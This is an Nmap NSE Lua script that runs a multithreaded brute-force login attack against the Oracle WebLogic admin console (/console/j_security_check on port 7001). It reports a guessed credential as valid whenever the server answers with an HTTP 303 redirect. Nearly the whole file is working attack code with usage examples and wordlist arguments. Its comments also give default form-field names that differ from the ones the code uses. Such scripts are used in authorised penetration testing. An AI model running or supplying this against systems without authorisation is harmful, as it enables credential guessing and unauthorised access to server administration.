local brute = require "brute"
local creds = require "creds"
local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"

description = [[
Weblogic Console Brute Script
]]

---
-- @usage
-- nmap -sV --script http-weblogic-brute <target> -p 7001
-- nmap -sV --script http-weblogic-brute
--   --script-args 'userdb=users.txt,passdb=passwds.txt,http-weblogic-brute.hostname=domain.com,
--                  http-weblogic-brute.threads=3,brute.firstonly=true' <target> -p 7001
--
-- @output
-- PORT     STATE SERVICE REASON
-- 7001/tcp   open  http    syn-ack
-- | http-weblogic-brute:
-- |   Accounts
-- |     0xdeadb33f:god => Login correct
-- |   Statistics
-- |_    Perfomed 103 guesses in 17 seconds, average tps: 6
--
-- @args http-weblogic-brute.uri points to the file '/console/j_security_check'. Default /console/j_security_check
-- @args http-weblogic-brute.hostname sets the host header in case of virtual
--       hosting
-- @args http-weblogic-brute.uservar sets the http-variable name that holds the
--                                    username used to authenticate. Default: log
-- @args http-weblogic-brute.passvar sets the http-variable name that holds the
--                                    password used to authenticate. Default: pwd
-- @args http-weblogic-brute.threads sets the number of threads. Default: 3
--
-- Other useful arguments when using this script are:
-- * http.useragent = String - User Agent used in HTTP requests
-- * brute.firstonly = Boolean - Stop attack when the first credentials are found
-- * brute.mode = user/creds/pass - Username password iterator
-- * passdb = String - Path to password list
-- * userdb = String - Path to user list
--
-- @see http-form-brute.nse

author = "Rvn0xsy <payloads@aliyun.com>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive", "brute"}


portrule = function(host,port)
  if( port.state=="open" and port.number == 7001 ) then
    return true
  else
    return false
  end  
end

local DEFAULT_WC_URI = "/console/j_security_check"
local DEFAULT_WC_USERVAR = "j_username"
local DEFAULT_WC_PASSVAR = "j_password"
local DEFAULT_THREAD_NUM = 3

---
--This class implements the Driver class from the Brute library
---
Driver = {
  new = function(self, host, port, options)
    local o = {}
    setmetatable(o, self)
    self.__index = self
    o.hostname = stdnse.get_script_args('http-weblogic-brute.hostname')
    o.http_options = {
      no_cache = true,
      header = {
        -- nil just means not set, so default http.lua behavior
        Host = stdnse.get_script_args('http-weblogic-brute.hostname')
      }
    }
    o.host = host
    o.port = port
    o.uri = stdnse.get_script_args('http-weblogic-brute.uri') or DEFAULT_WC_URI
    o.options = options
    return o
  end,

  connect = function( self )
    -- This will cause problems, as there is no way for us to "reserve"
    -- a socket. We may end up here early with a set of credentials
    -- which won't be guessed until the end, due to socket exhaustion.
    return true
  end,

  login = function( self, username, password )
    stdnse.debug2("HTTP POST %s%s", self.http_options.header.Host or stdnse.get_hostname(self.host), self.uri)
    self.http_options.header["User-Agent"] = "User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_7_0)AppleWebKit/535.11(KHTML,likeGecko)Chrome/17.0.963.56Safari/535.11"
    local response = http.post( self.host, self.port, self.uri, self.http_options,
      nil, { [self.options.uservar] = username, [self.options.passvar] = password } )
    -- This redirect is taking us to /console/index.jsp
    if response.status == 303 then
      return true, creds.Account:new( username, password, creds.State.VALID)
    end

    return false, brute.Error:new( "Incorrect password" )
  end,

  disconnect = function( self )
    return true
  end,

  check = function( self )
    local response = http.get( self.host, self.port, self.uri, self.http_options )
    stdnse.debug1("HTTP GET %s%s", self.http_options.header.Host or stdnse.get_hostname(self.host), self.uri)
    if ( response.status < 404 ) then
      stdnse.debug1("Initial check passed. Launching brute force attack")
      return true
     else
      stdnse.debug1("Initial check failed. Password field wasn't found")
    end
    return false
  end

}
---
--MAIN
---
action = function( host, port )
  stdnse.debug1(":) Loading Action SUCCESS !")  
  local status, result, engine
  local uservar = stdnse.get_script_args('http-weblogic-brute.uservar') or DEFAULT_WC_USERVAR
  local passvar = stdnse.get_script_args('http-weblogic-brute.passvar') or DEFAULT_WC_PASSVAR
  local thread_num = tonumber(stdnse.get_script_args("http-weblogic-brute.threads")) or DEFAULT_THREAD_NUM

  engine = brute.Engine:new( Driver, host, port, { uservar = uservar, passvar = passvar } )
  engine:setMaxThreads(thread_num)
  engine.options.script_name = SCRIPT_NAME
  status, result = engine:start()

  return result
end
